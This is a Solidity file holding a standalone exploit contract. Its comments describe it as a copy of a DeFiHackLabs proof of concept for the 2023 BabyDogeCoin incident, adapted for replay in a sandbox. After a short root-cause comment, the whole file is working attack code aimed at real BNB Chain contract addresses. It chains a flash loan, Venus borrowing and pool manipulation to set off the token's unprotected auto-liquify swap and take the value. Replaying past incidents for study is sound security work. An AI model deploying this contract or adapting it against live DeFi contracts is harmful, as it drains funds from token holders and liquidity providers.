// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-06-BabyDogeCoin02).
// The DeFiHackLabs PoC runs the WHOLE attack INLINE in the Foundry test contract
// (`ContractTest is Test`): the PancakeSwap V3 flash-loan callback
// `pancakeV3FlashCallback` lives on the test itself, and `testExploit` calls
// `init()` → `AddBabyDogeCoinWBNBLiquidity()` → `exploit()`. There is no
// standalone exploit contract to deploy, so this is a faithful, self-contained
// copy of that inline attack (testExploit → run; init/AddLiquidity/flash-callback
// logic copied verbatim) so the playground can deploy it and record run().
//
// Logic and constants are copied verbatim from
// test/BabyDogeCoin02_exp.sol. The only differences are: (1) it is a plain
// contract (no `is Test`, no forge-std), (2) `vm.deal` is replaced by relying on
// the recorder's setup.fundAttackerWei to fund the deployer, and (3) `vm.label`
// calls are dropped (labels live in the config).
//
// Root cause: BabyDogeCoin (a CoinToken reflection/auto-liquify token) fires
// `swapAndLiquify` synchronously inside `transfer()`, and the internal
// `swapTokensForEth` calls the Pancake router with `amountOutMin = 0` (no
// slippage protection). An attacker can crash the BabyDoge/WBNB price on the
// Pancake pair, push the token contract's own balance up to
// `numTokensSellToAddToLiquidity` (210,000 BABYDOGE), and trigger a 1-wei
// transfer that detonates `swapAndLiquify` — selling 105,000 BABYDOGE into the
// depressed pool for a pittance. The attacker then buys the dumped BABYDOGE back
// cheaply and sells it on BabyDoge's own router (0% fee for large holders),
// capturing the value the token contract gave away. Funded by a PancakeV3 flash
// loan (USDT+BUSD) lent into Venus against which ~99,463 WBNB is borrowed — all
// repaid intra-transaction. Net ~441.9 WBNB profit.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IWBNB {
    function deposit() external payable;
    function withdraw(uint256) external;
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IBabyDogeCoin is IERC20 {
    function numTokensSellToAddToLiquidity() external view returns (uint256);
}

interface Uni_Pair_V3 {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
    function balanceOf(address) external view returns (uint256);
}

interface ICErc20Delegate {
    function mint(uint256) external returns (uint256);
    function redeemUnderlying(uint256) external returns (uint256);
}

interface IcrETH {
    function borrow(uint256) external returns (uint256);
    function repayBorrow() external payable;
}

interface Uni_Router_V2 {
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256,
        address[] memory,
        address,
        uint256
    ) external payable;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256,
        uint256,
        address[] memory,
        address,
        uint256
    ) external;
    function swapTokensForExactTokens(uint256, uint256, address[] memory, address, uint256)
        external
        returns (uint256[] memory);
    function getAmountsIn(uint256 amountOut, address[] memory path) external view returns (uint256[] memory amounts);
    function WETH() external view returns (address);
}

interface IFeeFreeRouter {
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);
}

interface IUnitroller {
    function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);
    function getAccountLiquidity(address account) external view returns (uint256, uint256, uint256);
}

interface ISimplePriceOracle {
    function getUnderlyingPrice(address cToken) external view returns (uint256);
}

contract BabyDogeSandwich {
    IERC20 constant BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IWBNB constant WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IBabyDogeCoin constant BabyDogeCoin = IBabyDogeCoin(0xc748673057861a797275CD8A068AbB95A902e8de);
    Uni_Pair_V3 constant pool = Uni_Pair_V3(0x4f3126d5DE26413AbDCF6948943FB9D0847d9818);
    ICErc20Delegate constant vUSDT = ICErc20Delegate(0xfD5840Cd36d94D7229439859C0112a4185BC0255);
    ICErc20Delegate constant vBUSD = ICErc20Delegate(0x95c78222B3D6e262426483D42CfA53685A67Ab9D);
    IcrETH constant vBNB = IcrETH(0xA07c5b74C9B40447a954e1466938b865b6BBea36);
    Uni_Router_V2 constant BabyDogeRouter = Uni_Router_V2(0xC9a0F685F39d05D835c369036251ee3aEaaF3c47);
    Uni_Router_V2 constant Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IFeeFreeRouter constant FeeFreeRouter = IFeeFreeRouter(0x9869674E80D632F93c338bd398408273D20a6C8e);
    IUnitroller constant Unitroller = IUnitroller(0xfD36E2c2a6789Db23113685031d7F16329158384);
    ISimplePriceOracle constant VenusChainlinkOracle =
        ISimplePriceOracle(0xd8B6dA2bfEC71D684D3E2a2FC9492dDad5C3787F);
    address constant PancakePair = 0xc736cA3d9b1E90Af4230BD8F9626528B3D4e0Ee0;
    address constant BabyDogeRouterPair = 0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1;

    uint256 borrowAmount;
    uint256 USDTFlashLoanAmount;
    uint256 BUSDFlashLoanAmount;

    function run() external payable {
        init();
        AddBabyDogeCoinWBNBLiquidity();
        exploit();
    }

    function init() internal {
        USDT.approve(address(vUSDT), type(uint256).max);
        BUSD.approve(address(vBUSD), type(uint256).max);
        address[] memory cTokens = new address[](3);
        cTokens[0] = address(vUSDT);
        cTokens[1] = address(vBUSD);
        cTokens[2] = address(vBNB);
        Unitroller.enterMarkets(cTokens);
    }

    function AddBabyDogeCoinWBNBLiquidity() public payable {
        // The recorder funds this deployer with 0.01 ether via setup.fundAttackerWei.
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(BabyDogeCoin);
        BabyDogeRouter.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 0.005 ether}(
            1, path, address(this), block.timestamp
        );
        WBNB.deposit{value: 0.005 ether}();
        WBNB.approve(address(FeeFreeRouter), WBNB.balanceOf(address(this)));
        BabyDogeCoin.approve(address(FeeFreeRouter), BabyDogeCoin.balanceOf(address(this)));
        FeeFreeRouter.addLiquidity(
            address(BabyDogeCoin),
            address(WBNB),
            BabyDogeCoin.balanceOf(address(this)) - 10_000 * 1e9,
            WBNB.balanceOf(address(this)),
            0,
            0,
            address(this),
            block.timestamp
        );
        IERC20(BabyDogeRouterPair).approve(
            address(FeeFreeRouter), IERC20(BabyDogeRouterPair).balanceOf(address(this))
        );
    }

    function exploit() internal {
        pool.flash(address(this), USDT.balanceOf(address(pool)), BUSD.balanceOf(address(pool)), new bytes(0));
    }

    function pancakeV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {
        borrowBNB();

        swapWBNBToBabyDogeCoinByBabyDogeRouterPair();
        Sandwich();
        swapBabyDogeCoinToWBNBByBabyDogeRouterPair();

        repayFlashLoan(amount0, amount1);
    }

    function borrowBNB() public payable {
        USDTFlashLoanAmount = USDT.balanceOf(address(this));
        BUSDFlashLoanAmount = BUSD.balanceOf(address(this));
        vUSDT.mint(USDT.balanceOf(address(this)));
        vBUSD.mint(BUSD.balanceOf(address(this)));
        (, uint256 AccountLiquidity,) = Unitroller.getAccountLiquidity(address(this));
        uint256 UnderlyingPrice = VenusChainlinkOracle.getUnderlyingPrice(address(vBNB));
        borrowAmount = (AccountLiquidity * 1e18 / UnderlyingPrice) * 9999 / 10_000;
        vBNB.borrow(borrowAmount);
    }

    function swapWBNBToBabyDogeCoinByBabyDogeRouterPair() internal {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(BabyDogeCoin);
        uint256 swapAmount =
            BabyDogeCoin.numTokensSellToAddToLiquidity() - BabyDogeCoin.balanceOf(address(BabyDogeCoin)) - 1e12;
        uint256[] memory amountIns = BabyDogeRouter.getAmountsIn(swapAmount, path);
        WBNB.deposit{value: address(this).balance}();
        WBNB.approve(address(BabyDogeRouter), amountIns[0]);
        BabyDogeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIns[0], 0, path, address(FeeFreeRouter), block.timestamp
        );
        FeeFreeRouter.removeLiquidity(
            address(BabyDogeCoin), address(WBNB), 1e9, 0, 0, address(BabyDogeCoin), block.timestamp
        ); // swap some WBNB to BabyDogeCoin , transfer to BabyDogeCoin contract

        WBNB.approve(address(BabyDogeRouter), WBNB.balanceOf(address(this)));
        BabyDogeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB.balanceOf(address(this)), 0, path, address(FeeFreeRouter), block.timestamp
        );
        FeeFreeRouter.removeLiquidity(
            address(BabyDogeCoin), address(WBNB), 1e9, 0, 0, PancakePair, block.timestamp
        ); // swap some WBNB to BabyDogeCoin , transfer to PancakePair contract
    }

    function Sandwich() internal {
        address[] memory path = new address[](2);
        path[0] = address(BabyDogeCoin);
        path[1] = address(WBNB);
        BabyDogeCoin.approve(address(Router), 1);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(1, 1, path, address(this), block.timestamp); // swap BabyDogeCoin to WBNB

        uint256 transferAmount =
            BabyDogeCoin.numTokensSellToAddToLiquidity() - BabyDogeCoin.balanceOf(address(BabyDogeCoin));
        BabyDogeCoin.transfer(address(BabyDogeCoin), transferAmount);
        BabyDogeCoin.transfer(address(this), 1); // trigger swap BabyDogeCoin to WBNB without slippage protection

        path[0] = address(WBNB);
        path[1] = address(BabyDogeCoin);
        WBNB.approve(address(Router), WBNB.balanceOf(address(this)));
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB.balanceOf(address(this)), 1, path, address(FeeFreeRouter), block.timestamp
        ); // swap WBNB to BabyDogeCoin
        FeeFreeRouter.removeLiquidity(
            address(BabyDogeCoin), address(WBNB), 1e9, 0, 0, BabyDogeRouterPair, block.timestamp
        );
    }

    function swapBabyDogeCoinToWBNBByBabyDogeRouterPair() internal {
        address[] memory path = new address[](2);
        path[0] = address(BabyDogeCoin);
        path[1] = address(WBNB);
        BabyDogeCoin.approve(address(BabyDogeRouter), 1);
        BabyDogeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            1, 1, path, address(this), block.timestamp
        ); // swap BabyDogeCoin to WBNB, get profit
    }

    function repayFlashLoan(uint256 amount0, uint256 amount1) internal {
        WBNB.withdraw(borrowAmount);
        vBNB.repayBorrow{value: address(this).balance}();
        vUSDT.redeemUnderlying(USDTFlashLoanAmount);
        vBUSD.redeemUnderlying(BUSDFlashLoanAmount);
        USDT.transfer(address(pool), USDTFlashLoanAmount);
        BUSD.transfer(address(pool), BUSDFlashLoanAmount);
        WBNB.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(USDT);
        Router.swapTokensForExactTokens(amount0, type(uint256).max, path, address(pool), block.timestamp);
        path[1] = address(BUSD);
        Router.swapTokensForExactTokens(amount1, type(uint256).max, path, address(pool), block.timestamp);
    }

    receive() external payable {}
}
